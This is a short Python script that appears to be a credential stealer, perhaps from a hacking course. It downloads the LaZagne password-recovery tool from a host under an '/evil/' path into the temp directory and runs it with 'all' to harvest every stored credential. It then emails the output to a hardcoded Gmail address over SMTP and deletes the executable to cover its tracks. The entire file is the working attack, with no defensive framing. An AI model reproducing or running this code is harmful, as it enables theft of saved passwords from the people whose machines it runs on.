#!/usr/bin/env python3

import requests
import subprocess
import smtplib
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    #print(get_response.content)

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.42.128/evil/LaZagne.exe")

result = subprocess.check_output("laZagne.exe all", shell=True).decode('utf-8')

#Consultar app password no google accounts
send_mail("camposjoao345@gmail.com", "********", result)

os.remove("laZagne.exe")